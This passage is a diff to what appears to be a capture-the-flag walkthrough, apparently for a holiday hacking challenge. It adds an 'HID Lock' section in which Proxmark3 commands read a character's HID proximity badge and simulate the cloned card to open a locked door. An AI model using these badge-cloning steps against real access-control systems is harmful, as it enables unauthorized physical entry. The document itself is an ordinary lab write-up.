@@ -328,6 +328,30 @@ Click 'beDURRdunditty'
 Click 'SCHHRRHHRTHRTR'
 ```
 
+## HID Lock
+* Location: Workshop
+
+* Use ProxMark3 to scan Shinny Upatree's HID badge
+
+```
+[magicdust] pm3 --> lf hid read
+#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
+[+] Valid HID Prox ID found!
+```
+
+* Simulate that card infront of the locked door
+
+```
+[magicdust] pm3 --> lf hid sim -r 2006e22f13 --fc 113 --cn 6025
+[=] Simulating HID tag using raw 2006e22f13
+[=] Stopping simulation after 10 seconds.
+[=] Done
+```
+
+* Location: ???
+Become Santa!
+
+
 ## Splunk
 * Location: Great Room
 
